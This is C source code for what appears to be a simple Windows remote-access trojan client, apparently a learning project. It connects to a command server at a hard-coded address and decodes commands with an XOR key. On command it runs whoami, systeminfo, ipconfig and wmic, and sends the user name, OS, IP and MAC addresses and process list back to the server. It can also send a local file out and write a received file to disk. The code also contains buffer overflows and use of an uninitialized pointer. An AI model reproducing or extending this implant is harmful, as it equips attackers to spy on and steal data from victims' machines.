#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")
#include <string.h>

char *get_output(int num){
    char buf[2000];
    char *str = NULL;
    char *temp = NULL;
    unsigned int size = 1;  // start with size of 1 to make room for null terminator
    unsigned int strlength;
    FILE *ls;

    if(num == 1) {
        if (NULL == (ls = popen("whoami", "r"))) {
            perror("popen");
            exit(EXIT_FAILURE);
        }
    }
    else if(num == 2){
        if(NULL == (ls = popen("systeminfo | findstr /i /c:'OS Name'", "r"))){
            perror("popen");
            exit(EXIT_FAILURE);
        }
    }
    else if(num == 3){
        if(NULL == (ls = popen("ipconfig | findstr /i 'ipv4'", "r"))){
            perror("popen");
            exit(EXIT_FAILURE);
        }
    }
    else if(num == 4){
        if(NULL == (ls = popen("ipconfig /all | findstr /i 'Physical'", "r"))){
            perror("popen");
            exit(EXIT_FAILURE);
        }
    }
    else if(num == 5){
        if(NULL == (ls = popen("wmic process get Description", "r"))){
            perror("popen");
            exit(EXIT_FAILURE);
        }
    }
    while (fgets(buf, sizeof(buf), ls) != NULL) {
        strlength = strlen(buf);
        temp = realloc(str, size + strlength);  // allocate room for the buf that gets appended
        if (temp == NULL) {
            // allocation error
        } else {
            str = temp;
        }
        strcpy(str + size - 1, buf);     // append buffer to str
        size += strlength;
    }
    //printf(str);
    pclose(ls);
    return(str);
}



char* decrypt(char *serv_command){
    int i;
    for(i = 0; i < strlen(serv_command); i++){
        serv_command[i] ^= 0x69;
    }
    return serv_command;
}

int main(){

    WSADATA wsa;
    SOCKET  s, out_socket;
    struct sockaddr_in server;
    int command_size;
    char command[20];
    int command_num;
    char *encrypt_username;
    char *encrypt_OS;
    char *encrypt_IP;
    char *encrypt_MAC;
    char *encrypt_Proc;
    FILE *file_pointer;
    char *filedata;
    long lSize;
    size_t download_res;
    char file_name[12];
    int file_data_size;


    // Initializing socket
    if(WSAStartup(MAKEWORD(2,2), &wsa) != 0)
    {
        printf("Socket startup failed with error: %d", WSAGetLastError());
        return 1;
    }

    // Creating socket
    if((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
    {
        printf("Socket could not be created: %d", WSAGetLastError());
    }

    // Server structure
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    server.sin_port = htons(12345);

    // Connecting to server
    out_socket = connect(s, (struct sockaddr *) &server, sizeof(server));
    if(out_socket < 0)
    {
        printf("Connect error\n");
        return 1;
    }
    printf("Connected to server\n");

    // Receiving commands from server
    while(1){

        command_size = recv(s, command, 40, 0);
        command[command_size] = '\0';
        //printf(command);
        strcpy(command, decrypt(command));

        // getUser command from server
        if(!strcmp(command, "getUser"))
        {
            encrypt_username = (char *) malloc(20);
            command_num = 1;
            printf("getUser command read\n");
            strcpy(encrypt_username, get_output(command_num));
            printf(encrypt_username);
            send(s, encrypt_username, strlen(encrypt_username), 0);
            free(encrypt_username);
            //strcpy(encrypt_username, decrypt(username));

        }
        // getOS command from server
        else if(!strcmp(command, "getOS")){
            encrypt_OS = (char *) malloc(40);
            printf("getOS command read\n");
            command_num = 2;
            strcpy(encrypt_OS, get_output(command_num));
            printf(encrypt_OS);
            send(s, encrypt_OS, strlen(encrypt_OS), 0);
            free(encrypt_OS);

        }
        // getIP command from server
        else if(!strcmp(command, "getIP")){
            encrypt_IP = (char *) malloc(50);
            printf("getIP command read\n");
            command_num = 3;
            strcpy(encrypt_IP, get_output(command_num));
            printf(encrypt_IP);
            send(s, encrypt_IP, strlen(encrypt_IP), 0);
            free(encrypt_IP);
        }
        // getMAC command from server
        else if(!strcmp(command, "getMAC")){
            encrypt_MAC = (char *) malloc(50);
            printf("getMAC command read\n");
            command_num = 4;
            strcpy(encrypt_MAC, get_output(command_num));
            printf(encrypt_MAC);
            send(s, encrypt_MAC, strlen(encrypt_MAC), 0);
            free(encrypt_MAC);
        }
        //getProc command from server
        else if(!strcmp(command, "getProc")){
            encrypt_Proc = (char *) malloc(2000);
            printf("getProc command read\n");
            command_num = 5;
            strcpy(encrypt_Proc, get_output(command_num));
            printf(encrypt_Proc);
            send(s, encrypt_Proc, strlen(encrypt_Proc), 0);
            free(encrypt_Proc);
        }
        // download command from server
        else if(!strcmp(command, "download")){
            printf("Download command read\n");
            file_pointer = fopen("download.txt", "rb");
            printf("Download test text");
            fseek(file_pointer, 0, SEEK_END);
            lSize = ftell(file_pointer);
            rewind(file_pointer);
            filedata = (char *) malloc(lSize + 1);
            fread(filedata, lSize, 1, file_pointer);
            fclose(file_pointer);
            filedata[lSize] = '\0';
            printf(filedata);
            send(s, filedata, strlen(filedata), 0);
            printf("File sent\n");
            free(filedata);
        }
        // upload command from server
        else if(!strcmp(command, "upload")){
            printf("Upload command read\n");
            file_data_size = recv(s, filedata, 1000, 0);
            filedata[file_data_size] = '\0';
            strcpy(file_name, "upload.txt");
           file_pointer = fopen(file_name, "wb");
           if(file_pointer == NULL){
               perror("ERROR");
           }
           fwrite(filedata, strlen(filedata), 1, file_pointer);
           fclose(file_pointer);
        }
        break;


    }
    closesocket(s);
    WSACleanup();
}